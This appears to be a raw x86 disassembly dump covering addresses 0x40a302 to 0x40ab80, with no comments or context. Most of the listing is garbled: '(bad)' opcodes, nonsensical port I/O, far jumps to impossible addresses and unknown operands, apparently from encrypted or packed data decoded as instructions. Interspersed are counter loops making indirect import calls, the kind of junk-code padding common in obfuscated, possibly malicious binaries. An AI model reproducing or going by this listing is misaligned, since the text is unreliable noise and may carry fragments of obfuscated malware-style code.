  40a302:	add    DWORD PTR [eax+0x16],0xa8b80cc9
  40a309:	inc    esi
  40a30a:	sahf   
  40a30b:	pop    ss
  40a30c:	mov    eax,0xb1f5492e
  40a311:	xchg   dl,bl
  40a313:	adc    ebx,ebx
  40a315:	lods   al,BYTE PTR ds:[esi]
  40a316:	stos   DWORD PTR es:[edi],eax
  40a317:	ficomp WORD PTR [esi+0xf]
  40a31a:	pop    esi
  40a31b:	ds (bad) 
  40a31d:	shr    BYTE PTR [esi-0x4325136],cl
  40a323:	cmp    edx,DWORD PTR [edx+0x3c5d85cf]
  40a329:	add    eax,0xa78c8783
  40a32e:	push   ebp
  40a32f:	ret    0x2039
  40a332:	inc    edi
  40a333:	push   ss
  40a334:	ja     0x40a373
  40a336:	rcl    BYTE PTR [ebx+0x2],0x14
  40a33a:	add    bl,dh
  40a33c:	sub    edi,esi
  40a33e:	popf   
  40a33f:	mov    bh,BYTE PTR [edx-0x43865d0]
  40a345:	xchg   edx,eax
  40a346:	cmp    BYTE PTR [ebx+0x5d829408],cl
  40a34c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a34d:	xchg   BYTE PTR [ebp+esi*8-0x30df3f6c],al
  40a354:	push   esp
  40a355:	or     bl,BYTE PTR ds:0xacb34c2e
  40a35b:	lods   al,BYTE PTR fs:[esi]
  40a35d:	clc    
  40a35e:	mov    esi,0xb6e01e6b
  40a363:	mov    ch,0x5d
  40a365:	ss push ebp
  40a367:	pusha  
  40a368:	xor    al,0x4b
  40a36a:	leave  
  40a36b:	mov    ebx,0xe4d95588
  40a370:	sub    al,0x92
  40a372:	pop    ebx
  40a373:	push   0xffffffe0
  40a375:	adc    al,0xc3
  40a377:	rol    DWORD PTR [ecx+0x4a6477d8],1
  40a37d:	cdq    
  40a37e:	sbb    edx,edi
  40a380:	jmp    0x40a32f
  40a382:	in     eax,dx
  40a383:	mov    edi,0xbb4c131c
  40a388:	ins    DWORD PTR es:[edi],dx
  40a389:	mov    dh,0x2b
  40a38b:	(bad)  
  40a38c:	fdivr  DWORD PTR [ebp+ebp*1-0x3677b6c2]
  40a393:	sub    dh,0x9
  40a396:	int3   
  40a397:	dec    ebp
  40a398:	and    ch,dh
  40a39a:	scas   eax,DWORD PTR es:[edi]
  40a39b:	outs   dx,BYTE PTR ds:[esi]
  40a39c:	xor    BYTE PTR [edi-0x755244b4],0xb5
  40a3a3:	in     eax,0x1e
  40a3a5:	fldz   
  40a3a7:	loope  0x40a38b
  40a3a9:	pop    edi
  40a3aa:	cmp    eax,esi
  40a3ac:	popa   
  40a3ad:	sub    al,0xb7
  40a3af:	mov    ebx,0xef5fb57b
  40a3b4:	fld    QWORD PTR [edi]
  40a3b6:	ror    DWORD PTR ds:0xc9fbff4c,cl
  40a3bc:	lds    eax,FWORD PTR [ebp+0x15]
  40a3bf:	jle    0x40a3e7
  40a3c1:	outs   dx,DWORD PTR ds:[esi]
  40a3c2:	adc    esp,ebp
  40a3c4:	mov    al,0xb7
  40a3c6:	push   ebp
  40a3c7:	xchg   ebp,eax
  40a3c8:	xchg   esp,eax
  40a3c9:	push   ds
  40a3ca:	push   es
  40a3cb:	jmp    0x7d63d0d5
  40a3d0:	rcl    cl,cl
  40a3d2:	and    al,0x5b
  40a3d4:	nop
  40a3d5:	sub    ebx,DWORD PTR [esp+ebp*4+0x6266702e]
  40a3dc:	mov    edx,0x2b6f7cf7
  40a3e1:	aas    
  40a3e2:	push   esp
  40a3e3:	pop    es
  40a3e4:	pop    esi
  40a3e5:	mov    ds:0x2f6a6364,eax
  40a3ea:	les    edi,FWORD PTR [eax+edx*4+0xd10abd0]
  40a3f1:	and    BYTE PTR [ecx-0x382d1c51],ch
  40a3f7:	or     BYTE PTR [esi],0xc7
  40a3fa:	inc    ebp
  40a3fb:	aam    0x3b
  40a3fd:	test   DWORD PTR [eax+edi*8+0x3ad045c7],ebx
  40a404:	test   DWORD PTR [eax+edi*8+0x45c7ff0b],ebx
  40a40b:	int3   
  40a40c:	cmp    eax,0x1bf89c85
  40a411:	cmp    eax,0x434587
  40a416:	mov    DWORD PTR [ebp-0x38],0xf89c853c
  40a41d:	mov    DWORD PTR ds:0x4344f3,0x13
  40a427:	cmp    DWORD PTR ds:0x4344f3,0x0
  40a42e:	je     0x40a4bc
  40a434:	cmp    DWORD PTR ds:0x4344f3,0x21
  40a43b:	jne    0x40a44c
  40a441:	push   0x43460f
  40a446:	call   DWORD PTR ds:0x413338
  40a44c:	xor    edi,edi
  40a44e:	xor    edi,DWORD PTR ds:0x4344f3
  40a454:	dec    edi
  40a455:	mov    DWORD PTR ds:0x4344f3,edi
  40a45b:	jmp    0x40a427
  40a460:	and    DWORD PTR ds:0x4345fb,0x0
  40a46a:	mov    edx,DWORD PTR ds:0x4345fb
  40a470:	inc    edx
  40a471:	mov    DWORD PTR ds:0x4345fb,edx
  40a477:	cmp    DWORD PTR ds:0x4345fb,0x21
  40a47e:	jne    0x40a4a9
  40a484:	push   0x18fd
  40a489:	push   0x7257
  40a48e:	push   DWORD PTR [ebp-0xc]
  40a491:	push   0x4345b7
  40a496:	push   0x5f6e
  40a49b:	push   DWORD PTR [ebp-0xc]
  40a49e:	push   0x4348a7
  40a4a3:	call   DWORD PTR ds:0x41333c
  40a4a9:	cmp    DWORD PTR ds:0x4345fb,0x15
  40a4b0:	jb     0x40a46a
  40a4b6:	or     DWORD PTR ds:0x43454b,ebx
  40a4bc:	mov    DWORD PTR [ebp-0x3c],0xf89c853f
  40a4c3:	sbb    edi,0x2ba6
  40a4c9:	mov    edx,DWORD PTR [ebp+0x8]
  40a4cc:	xor    edx,eax
  40a4ce:	sub    DWORD PTR ds:0x434593,ecx
  40a4d4:	mov    edi,DWORD PTR [ebp-0x10]
  40a4d7:	or     DWORD PTR ds:0x434553,0x43454f
  40a4e1:	add    edx,ecx
  40a4e3:	cmp    edi,edx
  40a4e5:	je     0x40e6c9
  40a4eb:	mov    DWORD PTR ds:0x434577,0x7850
  40a4f5:	push   ebx
  40a4f6:	jmp    0x40de76
  40a4fb:	xor    DWORD PTR ds:0x434577,0x535d
  40a505:	mov    edx,DWORD PTR [ebp-0x8]
  40a508:	add    DWORD PTR ds:0x434603,edx
  40a50e:	mov    edi,DWORD PTR [ebp-0x10]
  40a511:	add    DWORD PTR ds:0x4345cb,0x43457b
  40a51b:	sub    edi,edx
  40a51d:	mov    DWORD PTR ds:0x43454f,0x500e
  40a527:	mov    edx,DWORD PTR [ebp-0x4]
  40a52a:	and    DWORD PTR ds:0x43454f,0x1370
  40a534:	xor    edx,eax
  40a536:	add    DWORD PTR ds:0x4344f3,0x35ec
  40a540:	add    edx,ecx
  40a542:	mov    DWORD PTR ds:0x4344fb,0xac0
  40a54c:	cmp    edi,edx
  40a54e:	mov    DWORD PTR ds:0x4345fb,0x5818
  40a558:	jb     0x40e2b1
  40a55e:	mov    ebx,DWORD PTR ds:0x434617
  40a564:	mov    edx,DWORD PTR ds:0x434627
  40a56a:	sub    ebx,edx
  40a56c:	xor    ebx,DWORD PTR [ebx+edx*1]
  40a56f:	mov    edx,DWORD PTR [ebp-0x28]
  40a572:	mov    edi,DWORD PTR [ebp-0x4]
  40a575:	and    DWORD PTR ds:0x43453f,0x0
  40a57f:	mov    ebx,DWORD PTR ds:0x43453f
  40a585:	inc    ebx
  40a586:	mov    DWORD PTR ds:0x43453f,ebx
  40a58c:	cmp    DWORD PTR ds:0x43453f,0x9
  40a593:	jne    0x40a5a2
  40a599:	push   DWORD PTR [ebp-0x20]
  40a59c:	call   DWORD PTR ds:0x413340
  40a5a2:	cmp    DWORD PTR ds:0x43453f,0x8
  40a5a9:	jne    0x40a5bc
  40a5af:	mov    ebx,DWORD PTR ds:0x43453f
  40a5b5:	inc    ebx
  40a5b6:	mov    DWORD PTR ds:0x43453f,ebx
  40a5bc:	cmp    DWORD PTR ds:0x43453f,0x1c
  40a5c3:	jb     0x40a57f
  40a5c9:	xor    edx,eax
  40a5cb:	inc    ebx
  40a5cc:	xor    edi,eax
  40a5ce:	sbb    ebx,DWORD PTR ds:0x43457f
  40a5d4:	add    edi,ecx
  40a5d6:	or     DWORD PTR ds:0x434537,ecx
  40a5dc:	add    edx,ecx
  40a5de:	imul   edx,edi
  40a5e1:	mov    edi,DWORD PTR [ebp-0x8]
  40a5e4:	mov    DWORD PTR ds:0x43454b,0x1b
  40a5ee:	cmp    DWORD PTR ds:0x43454b,0x0
  40a5f5:	je     0x40a629
  40a5fb:	cmp    DWORD PTR ds:0x43454b,0x1d
  40a602:	jne    0x40a611
  40a608:	push   DWORD PTR [ebp-0x10]
  40a60b:	call   DWORD PTR ds:0x413404
  40a611:	mov    ebx,DWORD PTR ds:0x43454b
  40a617:	dec    ebx
  40a618:	mov    DWORD PTR ds:0x43454b,ebx
  40a61e:	jmp    0x40a5ee
  40a623:	and    DWORD PTR ds:0x4345c7,ecx
  40a629:	mov    ebx,DWORD PTR [ebp-0x10]
  40a62c:	sub    ebx,edi
  40a62e:	cmp    ebx,edx
  40a630:	mov    DWORD PTR ds:0x43453f,0x5ce6
  40a63a:	ja     0x40aa85
  40a640:	xor    edx,edx
  40a642:	add    edx,DWORD PTR ds:0x4345bf
  40a648:	add    DWORD PTR ds:0x434613,edx
  40a64e:	mov    edx,DWORD PTR [ebp-0x4]
  40a651:	or     DWORD PTR ds:0x43457f,0x434607
  40a65b:	jmp    0x40aa72
  40a660:	xchg   edx,eax
  40a661:	dec    ebx
  40a662:	in     al,0xe
  40a664:	in     eax,dx
  40a665:	test   eax,0x2c38537c
  40a66a:	out    0x8f,eax
  40a66c:	push   ebp
  40a66d:	jg     0x40a6d9
  40a66f:	pushf  
  40a670:	cli    
  40a671:	bnd jle 0x40a6f2
  40a674:	jo     0x40a6ef
  40a676:	jle    0x40a6f6
  40a678:	cdq    
  40a679:	xchg   esi,eax
  40a67a:	mov    esi,0x37a5342d
  40a67f:	ins    BYTE PTR es:[edi],dx
  40a680:	lahf   
  40a681:	push   0x3e
  40a683:	cmp    edx,DWORD PTR [ecx]
  40a685:	fst    QWORD PTR [esi+esi*1-0x41371f7]
  40a68c:	jns    0x40a698
  40a68e:	jo     0x40a65d
  40a690:	dec    ecx
  40a691:	test   DWORD PTR [ecx+0x36],ebx
  40a694:	cmp    DWORD PTR [ebx-0x8],0xffffffbc
  40a698:	iret   
  40a699:	(bad)  
  40a69a:	and    esi,edi
  40a69c:	in     al,0x14
  40a69e:	sbb    al,0xe6
  40a6a0:	jmp    0xe47581a8
  40a6a5:	inc    edx
  40a6a6:	add    DWORD PTR [edx-0x22e97f8e],0x5606c092
  40a6b0:	fadd   QWORD PTR [ebp-0x48]
  40a6b3:	pop    ebx
  40a6b4:	sbb    ebx,esp
  40a6b6:	(bad)  
  40a6b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6b8:	mov    edi,0xe13864
  40a6bd:	xchg   ecx,eax
  40a6be:	ds test al,0xfe
  40a6c1:	xor    DWORD PTR [ebp+0x4b],eax
  40a6c4:	sbb    DWORD PTR [edi+edi*8-0x14],edi
  40a6c8:	inc    esp
  40a6c9:	imul   BYTE PTR [edi]
  40a6cb:	not    DWORD PTR [edi+ecx*8]
  40a6ce:	dec    ecx
  40a6cf:	mov    gs,edi
  40a6d1:	jb     0x40a676
  40a6d3:	ins    DWORD PTR es:[edi],dx
  40a6d4:	xchg   esi,eax
  40a6d5:	icebp  
  40a6d6:	(bad)  
  40a6d7:	shl    DWORD PTR ds:0x5e055dae,1
  40a6dd:	test   DWORD PTR [ecx+ecx*2+0x2f92bb4e],ecx
  40a6e4:	push   ecx
  40a6e5:	jbe    0x40a6ae
  40a6e7:	jbe    0x40a754
  40a6e9:	cwde   
  40a6ea:	enter  0x3923,0x98
  40a6ee:	pop    ebx
  40a6ef:	mov    DWORD PTR [edi+ecx*8+0x49d10f3b],ebx
  40a6f6:	mov    esp,DWORD PTR [edx]
  40a6f8:	pop    edx
  40a6f9:	into   
  40a6fa:	repnz jecxz 0x40a6bf
  40a6fd:	es push ebx
  40a6ff:	ins    DWORD PTR es:[edi],dx
  40a700:	imul   ebx,DWORD PTR [ebx],0x55b2b108
  40a706:	push   edi
  40a707:	push   0x4cf2c83b
  40a70c:	rol    DWORD PTR [edx],0x37
  40a70f:	inc    esi
  40a710:	test   al,0x7a
  40a712:	std    
  40a713:	push   es
  40a714:	add    ebp,eax
  40a716:	add    DWORD PTR [ecx+eax*4],ecx
  40a719:	adc    BYTE PTR [edx-0x72e92e9b],0x84
  40a720:	leave  
  40a721:	js     0x40a72a
  40a723:	stos   DWORD PTR es:[edi],eax
  40a724:	sbb    ebp,esp
  40a726:	dec    ebp
  40a727:	dec    ecx
  40a728:	(bad)  
  40a729:	hlt    
  40a72a:	inc    edi
  40a72b:	loopne 0x40a6ba
  40a72d:	lahf   
  40a72e:	xlat   BYTE PTR ds:[ebx]
  40a72f:	xlat   BYTE PTR ds:[ebx]
  40a730:	adc    bl,BYTE PTR [ebx+edx*8-0x75]
  40a734:	ins    BYTE PTR es:[edi],dx
  40a735:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a736:	mov    ch,0xad
  40a738:	pop    ds
  40a739:	inc    edx
  40a73a:	push   esi
  40a73b:	std    
  40a73c:	shl    BYTE PTR [edi],0x5f
  40a73f:	dec    ebx
  40a740:	or     ah,BYTE PTR [esi+0x1f]
  40a743:	add    ebx,edx
  40a745:	mov    edi,0x5a2569fa
  40a74a:	or     eax,0x53d05a6c
  40a74f:	mov    esi,0x93a0a760
  40a754:	add    esi,DWORD PTR [eax+0x7eec5e63]
  40a75a:	fwait
  40a75b:	iret   
  40a75c:	rol    BYTE PTR [ebx+esi*8],0xf
  40a760:	aaa    
  40a761:	fbstp  TBYTE PTR [eax+0xdd9e045]
  40a767:	(bad)  
  40a768:	jp     0x40a7d7
  40a76a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a76b:	sub    BYTE PTR [ebx],cl
  40a76d:	inc    edx
  40a76e:	outs   dx,BYTE PTR ds:[esi]
  40a76f:	mov    eax,0x93b36e58
  40a774:	xchg   ebx,eax
  40a775:	xchg   esi,eax
  40a776:	push   ds
  40a777:	xchg   BYTE PTR [ecx+ebx*1-0x64],bl
  40a77b:	jmp    0x30ea:0xf39d7bc
  40a782:	sbb    BYTE PTR [ebp+0x7d],cl
  40a785:	scas   eax,DWORD PTR es:[edi]
  40a786:	xchg   esi,eax
  40a787:	cwde   
  40a788:	jo     0x40a72d
  40a78a:	or     esi,DWORD PTR [esi+0x6a902e68]
  40a790:	enter  0xc856,0x5d
  40a794:	and    cl,0x8e
  40a797:	les    ebx,FWORD PTR [bp-0xe46]
  40a79c:	bound  esp,QWORD PTR [esi+eiz*4-0x236a3448]
  40a7a3:	and    al,0x1d
  40a7a5:	pop    esi
  40a7a6:	ret    0x357f
  40a7a9:	mov    cs,WORD PTR [esi+0x48cc3a61]
  40a7af:	rol    BYTE PTR [ebx+0x70fcc984],0xdb
  40a7b6:	xor    eax,0xa1f1412a
  40a7bb:	outs   dx,DWORD PTR ds:[esi]
  40a7bd:	add    bh,BYTE PTR [edx-0x890b739]
  40a7c3:	aas    
  40a7c4:	das    
  40a7c5:	jle    0x40a81b
  40a7c7:	mov    esp,0x874c4de1
  40a7cc:	ret    
  40a7cd:	mov    edx,0xac61fe7
  40a7d2:	pop    ds
  40a7d3:	scas   al,BYTE PTR es:[edi]
  40a7d4:	mov    dh,0x5b
  40a7d6:	std    
  40a7d7:	or     cl,ah
  40a7d9:	fldenv [edi-0x70]
  40a7dc:	or     esp,DWORD PTR [ebp-0x22]
  40a7df:	in     eax,0x2c
  40a7e1:	imul   eax,DWORD PTR [edi+0x4af05773],0xfffffff9
  40a7e8:	ret    
  40a7e9:	sti    
  40a7ea:	in     al,0x6b
  40a7ec:	int3   
  40a7ed:	lods   al,BYTE PTR ds:[esi]
  40a7ee:	stos   DWORD PTR es:[edi],eax
  40a7ef:	int3   
  40a7f0:	stos   DWORD PTR es:[edi],eax
  40a7f1:	sub    BYTE PTR ds:0x7c129f21,dh
  40a7f7:	mov    esi,0x6b19ccf7
  40a7fc:	out    dx,eax
  40a7fd:	mov    ds:0xf86ad318,al
  40a802:	mov    dl,0x73
  40a804:	popa   
  40a805:	cmp    BYTE PTR [eax+0x3a67c351],bh
  40a80b:	sub    eax,0x53f1a6cb
  40a810:	add    BYTE PTR [esi+0x50],bl
  40a813:	gs xchg edx,eax
  40a815:	and    ebx,DWORD PTR [edi+0x67]
  40a818:	pop    ebx
  40a819:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a81a:	repz pop ss
  40a81c:	test   al,0xc6
  40a81e:	(bad)  
  40a81f:	(bad)  
  40a821:	mov    ah,bh
  40a823:	add    eax,0x314aea51
  40a828:	out    0xd7,eax
  40a82a:	mov    edi,0xf0ac3a58
  40a82f:	dec    edx
  40a830:	imul   ecx,DWORD PTR [ebx+0x59],0xf875cf8c
  40a837:	ud1    esp,DWORD PTR [edi+0xf2de949]
  40a83e:	jns    0x40a8b7
  40a840:	out    dx,eax
  40a841:	sub    BYTE PTR [ecx+eax*8-0xa],ch
  40a845:	xor    al,BYTE PTR [edx+0xbed2782]
  40a84b:	rol    eax,0x99
  40a84e:	loop   0x40a81a
  40a850:	dec    ecx
  40a851:	adc    al,0x94
  40a853:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a854:	cmp    eax,0x43eb98eb
  40a859:	into   
  40a85a:	mov    eax,ds:0x734d7363
  40a85f:	pusha  
  40a860:	sahf   
  40a861:	jb     0x40a85f
  40a863:	cmp    BYTE PTR [edi],dl
  40a865:	pop    ebx
  40a866:	dec    eax
  40a867:	jge    0x40a86f
  40a869:	pop    ds
  40a86a:	test   DWORD PTR [ebx-0x394377f6],ebp
  40a870:	mov    cl,0x21
  40a872:	xchg   edx,eax
  40a873:	mov    bh,al
  40a875:	inc    ecx
  40a876:	xchg   ebx,eax
  40a877:	mov    WORD PTR [ecx+0x2e7e849b],fs
  40a87d:	xchg   bl,ah
  40a87f:	loop   0x40a8e2
  40a881:	or     ebx,0x566ef0eb
  40a887:	push   0x7
  40a889:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a88a:	jg     0x40a80e
  40a88c:	push   ds
  40a88d:	call   0xed29:0xd48ea12f
  40a894:	add    ecx,DWORD PTR [edx-0x1c]
  40a897:	push   esi
  40a898:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a899:	out    0xe5,al
  40a89b:	scas   eax,DWORD PTR es:[edi]
  40a89c:	lea    edx,[ebx+0x4eebb6c6]
  40a8a2:	mov    esi,0x66650e
  40a8a7:	xchg   ecx,eax
  40a8a8:	push   ecx
  40a8a9:	sub    esp,DWORD PTR [esi+eax*8-0x6a]
  40a8ad:	icebp  
  40a8ae:	mov    bl,ah
  40a8b0:	inc    ecx
  40a8b1:	push   es
  40a8b2:	and    eax,0x9cebbfbb
  40a8b7:	push   ebp
  40a8b8:	idiv   BYTE PTR [eax+0x3]
  40a8bb:	cmp    ah,al
  40a8bd:	cmp    eax,0xba01bfdf
  40a8c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8c3:	out    0xa8,eax
  40a8c5:	imul   ebx,DWORD PTR [eax+edi*1+0x3885577a],0xf8a88694
  40a8d0:	xchg   edi,eax
  40a8d1:	(bad)
  40a8d5:	sar    DWORD PTR [ecx],0x11
  40a8d8:	inc    esp
  40a8d9:	sahf   
  40a8da:	mov    edx,edx
  40a8dc:	fadd   st(1),st
  40a8de:	mov    edi,DWORD PTR [eax-0x50705901]
  40a8e4:	std    
  40a8e5:	add    BYTE PTR [eax-0x7e90f22b],al
  40a8eb:	or     DWORD PTR [ebp-0x7c6db24a],edi
  40a8f1:	sbb    eax,0x137cd6d4
  40a8f6:	xor    al,0xe5
  40a8f8:	push   edx
  40a8f9:	mov    WORD PTR [eax+0x171310f3],?
  40a8ff:	outs   dx,DWORD PTR ds:[esi]
  40a900:	adc    BYTE PTR [eax-0x3af7d4f1],0xfd
  40a907:	and    DWORD PTR [ecx+0x5d],esi
  40a90a:	and    eax,0xcac40b5a
  40a90f:	push   0xcf1a89c6
  40a914:	rcr    BYTE PTR [edi],0xec
  40a917:	ins    DWORD PTR es:[edi],dx
  40a918:	je     0x40a8d5
  40a91a:	dec    edx
  40a91b:	xor    al,BYTE PTR [esi-0x79]
  40a91e:	adc    eax,0x2f83a9a6
  40a923:	adc    BYTE PTR [ecx+0x2efc2cab],dl
  40a929:	xor    ebx,DWORD PTR [ecx]
  40a92b:	dec    esi
  40a92c:	data16 add BYTE PTR [edi-0x62],ch
  40a930:	xchg   edi,eax
  40a931:	jbe    0x40a902
  40a933:	jne    0x40a978
  40a935:	xchg   edi,eax
  40a936:	fcmovne st,st(6)
  40a938:	mov    ebx,0x1f9c800
  40a93d:	sbb    eax,0xc
  40a940:	xchg   ecx,eax
  40a941:	pusha  
  40a942:	repz adc al,0x8a
  40a945:	push   ebx
  40a946:	add    BYTE PTR ds:0x7e31bdb0,dl
  40a94c:	imul   eax,DWORD PTR [eax+0x51869fc8],0xd813ea81
  40a956:	cdq    
  40a957:	push   DWORD PTR [ebx+0x2f373641]
  40a95d:	sahf   
  40a95e:	add    eax,esp
  40a960:	pop    edx
  40a961:	int    0x23
  40a963:	add    DWORD PTR [esi],edx
  40a965:	in     al,dx
  40a966:	jno    0x40a9c9
  40a968:	dec    esp
  40a969:	jecxz  0x40a9d9
  40a96b:	cmp    al,0xf4
  40a96d:	mov    al,ds:0x469af44d
  40a972:	ins    DWORD PTR es:[edi],dx
  40a973:	jbe    0x40a98e
  40a975:	mov    dl,0x8b
  40a977:	gs ins BYTE PTR es:[edi],dx
  40a979:	xchg   BYTE PTR [edi-0x588e499b],dl
  40a97f:	or     ah,BYTE PTR [ebx-0x45f55b5a]
  40a985:	pop    ds
  40a986:	sbb    al,0xea
  40a988:	ss xor al,0xf7
  40a98b:	loop   0x40a9f3
  40a98d:	lods   al,BYTE PTR gs:[esi]
  40a98f:	dec    ebx
  40a990:	and    ch,BYTE PTR [esi-0x27c0e0b5]
  40a996:	je     0x40a949
  40a998:	jno    0x40a91b
  40a99a:	ret    
  40a99b:	jmp    0x17ba:0x90908a84
  40a9a2:	xor    DWORD PTR [eax-0x18e0124b],edi
  40a9a8:	jmp    DWORD PTR [ecx-0x3bcd953d]
  40a9ae:	push   edx
  40a9af:	je     0x40a981
  40a9b1:	cld    
  40a9b2:	jmp    DWORD PTR [ecx]
  40a9b4:	pusha  
  40a9b5:	fcom   DWORD PTR [eax+eax*8]
  40a9b8:	inc    eax
  40a9b9:	pop    ecx
  40a9ba:	pop    esp
  40a9bb:	aad    0x10
  40a9bd:	dec    esp
  40a9be:	mov    DWORD PTR [ebp+0x45],ebx
  40a9c1:	les    ebx,FWORD PTR [ebp+0x757ce35a]
  40a9c7:	leave  
  40a9c8:	loopne 0x40a9b5
  40a9ca:	gs addr16 cmp eax,0xafba729b
  40a9d1:	sti    
  40a9d2:	(bad)  
  40a9d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9d5:	ins    BYTE PTR es:[edi],dx
  40a9d6:	(bad)  
  40a9d7:	xor    al,0xc9
  40a9d9:	add    eax,0x5d306c94
  40a9de:	pop    edi
  40a9df:	push   esp
  40a9e0:	push   esi
  40a9e1:	mov    dl,0x8c
  40a9e3:	mov    ebx,?
  40a9e5:	pop    edi
  40a9e6:	jge    0x40a9b3
  40a9e8:	fsubr  QWORD PTR [edi+0x4f1290d2]
  40a9ee:	pusha  
  40a9ef:	dec    ecx
  40a9f0:	mov    al,0xc6
  40a9f2:	pop    esi
  40a9f3:	jno    0x40aa37
  40a9f5:	sbb    al,0xac
  40a9f7:	cmp    eax,DWORD PTR [esi]
  40a9f9:	pop    esp
  40a9fa:	xor    eax,DWORD PTR [edx]
  40a9fc:	jg     0x40a9b7
  40a9fe:	adc    eax,0x1db9e064
  40aa03:	mov    cl,0x87
  40aa05:	stos   DWORD PTR es:[edi],eax
  40aa06:	sub    DWORD PTR [ecx+0x4e],0x1b7d2f
  40aa0d:	int    0x5a
  40aa0f:	scas   eax,DWORD PTR es:[edi]
  40aa10:	inc    esp
  40aa11:	leave  
  40aa12:	test   DWORD PTR [ebp+0x67],edx
  40aa15:	lahf   
  40aa16:	sti    
  40aa17:	xchg   edx,eax
  40aa18:	fs es push cs
  40aa1b:	cmp    al,0xcc
  40aa1d:	fdiv   st,st(6)
  40aa1f:	outs   dx,BYTE PTR ds:[esi]
  40aa20:	shl    BYTE PTR [ebx+0x3ef7834d],0x4e
  40aa27:	inc    ebp
  40aa28:	hlt    
  40aa29:	dec    esp
  40aa2a:	mov    dl,0x6e
  40aa2c:	jo     0x40aa2a
  40aa2e:	aam    0xf6
  40aa30:	ja     0x40aaae
  40aa32:	cmp    edi,DWORD PTR [edx+0x7ad218b1]
  40aa38:	mov    dl,0xec
  40aa3a:	dec    esi
  40aa3b:	cld    
  40aa3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa3e:	sbb    DWORD PTR [ebx+0x7c4c2038],esp
  40aa44:	adc    eax,0x51d89ae6
  40aa49:	jge    0x40aabe
  40aa4b:	sbb    eax,0x94064102
  40aa50:	aam    0xaa
  40aa52:	mov    ds:0x27a5171c,eax
  40aa57:	sub    eax,0xf9361e2d
  40aa5c:	mov    gs,WORD PTR [eax-0x486c1050]
  40aa62:	cmp    eax,0xbd09948e
  40aa67:	je     0x40aa08
  40aa69:	xor    bh,ch
  40aa6b:	and    al,0x9d
  40aa6d:	mov    eax,0xe941d22b
  40aa72:	xor    edx,eax
  40aa74:	adc    DWORD PTR ds:0x434553,0x43457f
  40aa7e:	add    edx,ecx
  40aa80:	jmp    0x40c4f6
  40aa85:	mov    edx,DWORD PTR [ebp-0x2c]
  40aa88:	sub    DWORD PTR ds:0x4344f3,0x7416
  40aa92:	mov    edi,DWORD PTR [ebp-0x4]
  40aa95:	mov    ebx,DWORD PTR ds:0x4345fb
  40aa9b:	sub    ebx,DWORD PTR ds:0x43460b
  40aaa1:	mov    DWORD PTR ds:0x4345fb,ebx
  40aaa7:	xor    edx,eax
  40aaa9:	xor    edi,eax
  40aaab:	or     ebx,0x1288
  40aab1:	add    edi,ecx
  40aab3:	adc    ebx,DWORD PTR ds:0x4345bb
  40aab9:	jmp    0x40aed0
  40aabe:	test   DWORD PTR [eax-0x4c324c3f],edi
  40aac4:	jne    0x40ab36
  40aac6:	xchg   ebx,eax
  40aac7:	in     eax,0x4e
  40aac9:	in     eax,dx
  40aaca:	ins    DWORD PTR es:[edi],dx
  40aacb:	test   al,0xe7
  40aacd:	sub    eax,0x7e7efefc
  40aad2:	jo     0x40ab4d
  40aad4:	jle    0x40ab54
  40aad6:	mov    WORD PTR [edx+0x3e],ss
  40aad9:	sub    DWORD PTR [eax+0x27],esp
  40aadc:	add    DWORD PTR [eax+0x4c],0x2959ed6d
  40aae3:	or     DWORD PTR [edi],0x8a6c2b29
  40aae9:	sahf   
  40aaea:	xchg   esp,eax
  40aaeb:	and    DWORD PTR [ebp+0x74],ebx
  40aaee:	and    al,BYTE PTR [eax+0x731cce36]
  40aaf4:	dec    ecx
  40aaf5:	sub    al,0xea
  40aaf7:	icebp  
  40aaf8:	or     ecx,DWORD PTR [eax]
  40aafa:	jae    0x40ab78
  40aafc:	shl    DWORD PTR [esi],cl
  40aafe:	fnstenv [eax-0x2eb87c6b]
  40ab04:	retf   
  40ab05:	pop    esp
  40ab06:	mov    ch,0xdd
  40ab08:	and    BYTE PTR [edi],dl
  40ab0a:	pop    eax
  40ab0b:	adc    BYTE PTR [eax],dh
  40ab0d:	popa   
  40ab0e:	inc    DWORD PTR [edx-0x68]
  40ab11:	xor    al,0x3d
  40ab13:	xor    edi,DWORD PTR [esi+0x5b]
  40ab16:	stos   BYTE PTR es:[edi],al
  40ab17:	jecxz  0x40aaa9
  40ab19:	mov    es,WORD PTR ds:0xe485481e
  40ab1f:	and    DWORD PTR [ebp-0x30],ecx
  40ab22:	leave  
  40ab23:	pop    ecx
  40ab24:	ficom  DWORD PTR [ebx]
  40ab26:	leave  
  40ab27:	pop    esi
  40ab28:	sbb    ebx,edx
  40ab2a:	mov    cl,BYTE PTR [edi]
  40ab2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab2d:	pop    ebx
  40ab2e:	mov    DWORD PTR [esi-0x1475f6cb],edi
  40ab34:	les    edx,FWORD PTR [ecx]
  40ab36:	dec    edx
  40ab37:	mov    eax,ds:0xc49814a5
  40ab3d:	stc    
  40ab3e:	jo     0x40aaf8
  40ab40:	xchg   edx,eax
  40ab41:	adc    eax,0xccadb8d5
  40ab46:	jmp    0x40aad4
  40ab48:	gs ja  0x40ab89
  40ab4b:	outs   dx,DWORD PTR ds:[esi]
  40ab4c:	sub    eax,0xed87e858
  40ab51:	leave  
  40ab52:	lahf   
  40ab53:	das    
  40ab54:	lock fwait
  40ab56:	dec    ebx
  40ab57:	loopne 0x40ab99
  40ab59:	and    al,0x96
  40ab5b:	add    al,0xc1
  40ab5d:	inc    edx
  40ab5e:	xchg   DWORD PTR [edi-0x27effe38],edx
  40ab64:	call   0x14742f2e
  40ab69:	mov    ds,esp
  40ab6b:	iret   
  40ab6c:	xchg   edx,eax
  40ab6d:	test   al,0x48
  40ab6f:	pop    eax
  40ab70:	or     eax,0xcf2914f8
  40ab75:	pop    ds
  40ab76:	ss adc al,0x2c
  40ab79:	(bad)  
  40ab7a:	cmp    bl,cl
  40ab7c:	adc    DWORD PTR [eax+ecx*8+0x3b],esi
  40ab80:	gs push ss
